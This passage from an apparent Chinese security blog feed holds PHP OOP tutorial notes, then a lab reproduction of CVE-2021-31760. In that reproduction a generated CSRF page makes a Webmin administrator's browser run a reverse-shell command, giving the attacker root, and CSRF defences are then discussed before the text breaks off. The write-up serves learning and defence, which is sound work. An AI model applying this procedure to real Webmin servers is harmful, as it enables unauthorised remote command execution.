<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> constant = <span class="string">'constant value'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showConstant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">self</span>::constant . <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> MyClass::constant . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">"MyClass"</span>;</span><br><span class="line"><span class="keyword">echo</span> $classname::constant . <span class="string">"\n"</span>; <span class="comment">// 自 5.3.0 起</span></span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> MyClass();</span><br><span class="line">$class-&gt;showConstant();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $class::constant.<span class="string">"\n"</span>; <span class="comment">// 自 PHP 5.3.0 起</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="类的自动加载"><a href="#类的自动加载" class="headerlink" title="类的自动加载"></a>类的自动加载</h3><p>在编写面向对象（OOP） 程序时，很多开发者为每个类新建一个 PHP 文件。 这会带来一个烦恼：每个脚本的开头，都需要包含（include）一个长长的列表（每个类都有个文件）。</p>
<p>在 PHP 5 中，已经不再需要这样了。 <a href="https://www.php.net/manual/zh/function.spl-autoload-register.php" target="_blank" rel="noopener">spl_autoload_register()</a> 函数可以注册任意数量的自动加载器，当使用尚未被定义的类（class）和接口（interface）时自动去加载。通过注册自动加载器，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</p>
<p>自动加载不可用于 PHP 的 CLI <a href="https://www.php.net/manual/zh/features.commandline.php" target="_blank" rel="noopener">交互模式</a>。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span> <span class="params">($class_name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> $class_name . <span class="string">'.php'</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$obj  = <span class="keyword">new</span> MyClass1();</span><br><span class="line">$obj2 = <span class="keyword">new</span> MyClass2();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h3><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>创建新对象时先调用此方法。初始化。</p>
<blockquote>
<p><strong>Note</strong>: 如果子类中定义了构造函数则不会隐式调用其父类的构造函数。要执行父类的构造函数，需要在子类的构造函数中调用 **parent::__construct()**。如果子类没有定义构造函数则会如同一个普通的类方法一样从父类继承（假如没有被定义为 private 的话）。</p>
</blockquote>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
<p>和构造函数一样，父类的析构函数不会被引擎暗中调用。要执行父类的析构函数，必须在子类的析构函数体中显式调用 **parent::__destruct()**。此外也和构造函数一样，子类如果自己没有定义析构函数则会继承父类的。</p>
<p>析构函数即使在使用 <a href="https://www.php.net/manual/zh/function.exit.php" target="_blank" rel="noopener">exit()</a> 终止脚本运行时也会被调用。在析构函数中调用 <a href="https://www.php.net/manual/zh/function.exit.php" target="_blank" rel="noopener">exit()</a> 将会中止其余关闭操作的运行。</p>
<blockquote>
<p><strong>Note</strong>: 试图在析构函数（在脚本终止时被调用）中抛出一个异常会导致致命错误。</p>
</blockquote>
<h3 id="访问控制（可见性）"><a href="#访问控制（可见性）" class="headerlink" title="访问控制（可见性）"></a>访问控制（可见性）</h3><p>对属性或方法的访问控制，是通过在前面添加关键字 <em>public</em>（公有），<em>protected</em>（受保护）或 <em>private</em>（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p>
<h4 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h4><p>类属性必须定义为公有，受保护，私有之一。如果用 <em>var</em> 定义，则被视为公有。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $public = <span class="string">'Public'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $protected = <span class="string">'Protected'</span>;</span><br><span class="line">    <span class="keyword">private</span> $private = <span class="string">'Private'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> MyClass();</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;private; <span class="comment">// 这行也会产生一个致命错误</span></span><br><span class="line">$obj-&gt;printHello(); <span class="comment">// 输出 Public、Protected 和 Private</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 可以对 public 和 protected 进行重定义，但 private 而不能</span></span><br><span class="line">    <span class="keyword">protected</span> $protected = <span class="string">'Protected2'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj2 = <span class="keyword">new</span> MyClass2();</span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;private; <span class="comment">// 未定义 private</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">$obj2-&gt;printHello(); <span class="comment">// 输出 Public、Protected2 和 Undefined</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个公有的构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个公有的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个受保护的方法</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个私有的方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此方法为公有</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPrivate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass = <span class="keyword">new</span> MyClass;</span><br><span class="line">$myclass-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line">$myclass-&gt;MyProtected(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">$myclass-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">$myclass-&gt;Foo(); <span class="comment">// 公有，受保护，私有都可以执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 此方法为公有</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass2 = <span class="keyword">new</span> MyClass2;</span><br><span class="line">$myclass2-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line">$myclass2-&gt;Foo2(); <span class="comment">// 公有的和受保护的都可执行，但私有的不行</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;testPrivate();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;testPublic();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Bar::testPublic\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Bar::testPrivate\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Foo::testPublic\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Foo::testPrivate\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myFoo = <span class="keyword">new</span> foo();</span><br><span class="line">$myFoo-&gt;test(); <span class="comment">// Bar::testPrivate </span></span><br><span class="line">                <span class="comment">// Foo::testPublic</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>当扩展一个类，子类就会继承父类所有公有的和受保护的方法。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bar</span> <span class="keyword">extends</span> <span class="title">foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// codes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="范围解析操作符-（-）"><a href="#范围解析操作符-（-）" class="headerlink" title="范围解析操作符 （::）"></a>范围解析操作符 （::）</h3><p>可以用于访问<a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener">静态</a>成员，<a href="https://www.php.net/manual/zh/language.oop5.constants.php" target="_blank" rel="noopener">类常量</a>，还可以用于覆盖类中的属性和方法。</p>
<p>实例：</p>
<p>在类定义外部使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> CONST_VALUE = <span class="string">'A constant value'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">'MyClass'</span>;</span><br><span class="line"><span class="keyword">echo</span> $classname::CONST_VALUE; <span class="comment">// 自 PHP 5.3.0 起</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> MyClass::CONST_VALUE;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>self，parent 和 static 这三个特殊的关键字是用于在类定义的内部对其属性或方法进行访问的。</p>
<p>在类定义内部使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OtherClass</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $my_static = <span class="string">'static var'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">doubleColon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">parent</span>::CONST_VALUE . <span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">self</span>::$my_static . <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">'OtherClass'</span>;</span><br><span class="line"><span class="keyword">echo</span> $classname::doubleColon(); <span class="comment">// 自 PHP 5.3.0 起</span></span><br><span class="line"></span><br><span class="line">OtherClass::doubleColon();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用父类方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"MyClass::myFunc()\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OtherClass</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 覆盖了父类的定义</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 但还是可以调用父类中被覆盖的方法</span></span><br><span class="line">        <span class="keyword">parent</span>::myFunc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"OtherClass::myFunc()\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> OtherClass();</span><br><span class="line">$class-&gt;myFunc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Static-1"><a href="#Static-1" class="headerlink" title="Static"></a>Static</h3><p>声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。</p>
<p>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</p>
<p>静态属性不可以由对象通过 -&gt; 操作符来访问。</p>
<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>定义为抽象的类不能被实例化。如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的<a href="https://www.php.net/manual/zh/language.oop5.visibility.php" target="_blank" rel="noopener">访问控制</a>必须和父类中一样（或者更为宽松）。</p>
<h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><p>动态地创建类属性和方法。通过魔术方法（magic methods）来实现。</p>
<p>当调用当前环境下未定义或不<a href="https://www.php.net/manual/zh/language.oop5.visibility.php" target="_blank" rel="noopener">可见</a>的类属性或方法时，重载方法会被调用。</p>
<p>所有的重载方法都必须被声明为 <em>public</em>。</p>
<h4 id="属性重载"><a href="#属性重载" class="headerlink" title="属性重载"></a>属性重载</h4><p>在给不可访问属性赋值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set" target="_blank" rel="noopener">__set()</a> 会被调用。</p>
<p>读取不可访问属性的值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get" target="_blank" rel="noopener">__get()</a> 会被调用。</p>
<p>当对不可访问属性调用 <a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a> 或 <a href="https://www.php.net/manual/zh/function.empty.php" target="_blank" rel="noopener">empty()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset" target="_blank" rel="noopener">__isset()</a> 会被调用。</p>
<p>当对不可访问属性调用 <a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset" target="_blank" rel="noopener">__unset()</a> 会被调用。</p>
<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>在对象中调用一个不可访问方法时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call" target="_blank" rel="noopener">__call()</a> 会被调用。</p>
<p>在静态上下文中调用一个不可访问方法时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic" target="_blank" rel="noopener">__callStatic()</a> 会被调用。</p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><h4 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h4><p>序列化时先调用__sleep()方法。反序列话是wakeup方法。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-31760漏洞复现与CSRF攻击的分析</title>
    <url>/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>通过 CVE-2021-31760 对 CSRF 攻击做了一点更加深入的了解。</p>
<a id="more"></a>

<h2 id="CSRF-攻击的基本原理"><a href="#CSRF-攻击的基本原理" class="headerlink" title="CSRF 攻击的基本原理"></a>CSRF 攻击的基本原理</h2><p><strong>CSRF（Cross-site request forgery）</strong> 的意思是跨站请求伪造，指的是伪造了客户端的身份，以客户端的名义执行请求。</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/CSRF%E5%8E%9F%E7%90%86.jpg" alt="CSRF原理"></p>
<p>如图，我们可以看到 CSRF 的基本要素有两个：</p>
<ol>
<li>用户登录受信任网站 A，并在本地生成 Cookie</li>
<li>用户在不登出 A 的情况下打开攻击站点 B</li>
</ol>
<p>其攻击成功的原理是， A 网站正常登陆后，cookie 正常保存，攻击站点 B 通过某种方式调用 A 网站接口进行操作，此时在请求 A 的接口时会自动带上 cookie。</p>
<p>这个攻击的完成需要同时满足以上的两个要素，看起来似乎条件比较苛刻，但是它既然能登上 OWASP 的 top 10，那这两个条件想必也并不是那么难以满足的。比如：</p>
<ul>
<li>你不能保证你登录了一个网站后，不再打开一个 tab 页面并访问另外的网站。</li>
<li>你不能保证你关闭浏览器了后，你本地的 Cookie 立刻过期，你上次的会话已经结束。（由于关闭浏览器并不一定结束了一个会话）</li>
<li>上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</li>
</ul>
<p>这样看起来，给攻击站点好好包装一下，让它长得更加可信一点， CSRF 好像也没有那么困难（逃</p>
<h2 id="CVE-2021-31760-复现"><a href="#CVE-2021-31760-复现" class="headerlink" title="CVE-2021-31760 复现"></a>CVE-2021-31760 复现</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>利用 CSRF 攻击通过 Webmin 的运行进程特性实现 RCE（远程命令执行）。</p>
<p>Webmin 是一个对系统情况进行图形化管理的 Web 端工具。该漏洞在 Webmin 1.973 之前的版本均有效。利用该漏洞可以使服务器反弹 Shell 并以此获得管理员权限，实现 RCE。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用虚拟机在内网环境使用 docker 搭建服务。当然用公网也是可以的。配置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host: VMWare Ubuntu 20.04.3 LTS (192.168.110.105)</span><br><span class="line">Docker: Docker CE 20.10.10 - CentOS 8</span><br><span class="line">Webmin: Version 1.973 (192.168.110.105:10000)</span><br><span class="line">Attacker: WSL2 Ubuntu 20.04 LTS (172.31.114.202)</span><br></pre></td></tr></table></figure>

<p>将 docker 容器的 10000 端口映射到宿主机的 10000 端口，使得访问 192.168.110.105 的 10000 端口即可访问到容器内的 Webmin 服务。安装过程也很简单，在 sourceforge 下载 Webmin 源码后执行 <code>setup.sh</code> 即可。</p>
<h3 id="恶意请求构造"><a href="#恶意请求构造" class="headerlink" title="恶意请求构造"></a>恶意请求构造</h3><p>在 Attacker 主机上起好 nginx 服务使之能够被访问后，运行 CVE 给到的 exp ,填写需要的信息，生成一份用于攻击 Webmin 的页面。</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2.jpg" alt="生成恶意页面"></p>
<p>其实从这个 exp 的运行上来看，它的逻辑已经非常简单清晰了，不过我们也可以再拿它的源码来看一下它的运作过程。</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91.jpg" alt="主要逻辑"></p>
<p>可以非常明显地看到其主要逻辑就在这个 <code>CSRF_Generator()</code> 函数中，拿我们刚才填入的 target 信息和选择的反弹 shell 类型，去构建了一个可以提交 POST 表单的 CSRF 的页面，这个 POST 表单中的 cmd 字段就是构建的反弹 shell 的命令。由于有的服务器可能没安装某些语言，所以后边的几个弹 shell 的命令可能会失败…但是一般的服务器应该都有 bash 吧，所以选择第一个的 bash shell 是一般都能成功的。</p>
<p>之后在 Attacker 的本地开启 <code>nc</code> 监听一个特定的端口，当网站管理员点进了生成的恶意页面，就会将 cmd 提交到 Webmin 站点的 <code>/proc/run.cgi</code> 去执行，其中就包含了使用 <code>nc</code> 向 Attacker 反弹 shell 的逻辑。至此 Attacker 就将目标 getshell 了，之后也可以进行一些更加便于访问的操作，比如连个蚁剑什么的（</p>
<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>这里我使用了 bash shell 的选项，在 Attacker 主机上监听了 81 端口。当管理员访问了我们的页面时，可以看到 Attacker 机上成功拿到了 Root 权限的 Shell。</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/GetShell.jpg" alt="成功拿到了反弹 Shell"></p>
<h2 id="一些其它问题"><a href="#一些其它问题" class="headerlink" title="一些其它问题"></a>一些其它问题</h2><h3 id="同源策略和-CSRF"><a href="#同源策略和-CSRF" class="headerlink" title="同源策略和 CSRF"></a>同源策略和 CSRF</h3><p>在复现这个 CVE 的过程中产生了这样一个疑问：既然攻击者与目标机的域名是不一样的，浏览器为什么还会因为攻击者站点的跨域请求，将携带了 cookie 的 POST 请求发送到目标机呢？同源策略为什么没有对这个 CSRF 攻击产生限制？</p>
<h4 id="同源策略（SOP）"><a href="#同源策略（SOP）" class="headerlink" title="同源策略（SOP）"></a>同源策略（SOP）</h4><p>同源策略中的同源是指协议、域名、端口都一样。同源策略将不同源的各个服务隔离开，增加了安全性。之所以会遇到跨域问题，正是因为同源策略的各种限制。在不同的情况下，同源策略可能有不同的解释：</p>
<ul>
<li>限制 cookies、DOM 和 JavaScript 的命名区域</li>
<li>限制 iframe、图片等各种资源的内容操作</li>
<li>限制 ajax 请求的响应结果</li>
</ul>
<p>如果没有了 SOP：</p>
<ul>
<li>一个浏览器打开几个 tab，数据就泄露了</li>
<li>用 iframe 打开一个银行网站，可以肆意读取网站的内容，获取用户输入的内容</li>
<li>更加肆意地进行 CSRF</li>
</ul>
<h4 id="同源策略为什么不能防止-CSRF"><a href="#同源策略为什么不能防止-CSRF" class="headerlink" title="同源策略为什么不能防止 CSRF"></a>同源策略为什么不能防止 CSRF</h4><p>根据我们前面对同源策略的解释发现，同源策略并没有限制使用 html tag 加载资源，而且它并不是阻止接口请求而是拦截请求结果，CSRF 恰恰占了这两个便宜。它可以使用 html tag 进行实现，并且反弹 shell 的操作对于是否返回请求结果并不重要，这使得同源策略无法有效防止 CSRF。</p>
<p>对于 GET 请求，直接放到 <code>&lt;img&gt;</code> 就能神不知鬼不觉地请求跨域接口。对于 POST 请求，很多例子都使用 <code>&lt;form&gt;</code> 提交。归根到底，这两个方法不报跨域是因为请求由 html 控制，我们无法用 js 直接操作获得的结果。</p>
<p>不过同源策略并非完全没有作用。SOP 限制了 cookie 的命名区域，虽然请求会自动带上 cookies，但是攻击者无论如何还是无法获取 cookie 的内容本身。</p>
<h3 id="防范方式"><a href="#防范方式" class="headerlink" title="防范方式"></a>防范方式</h3><p>既然同源策略无法对 CSRF 进行有效的防范，那我们要防止 CSRF 就需要另辟蹊径。CSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。服务端防御 CSRF 的基本思想是在 cookie 中增加伪随机数。</p>
<ol>
<li><p>Cookie Hashing</p>
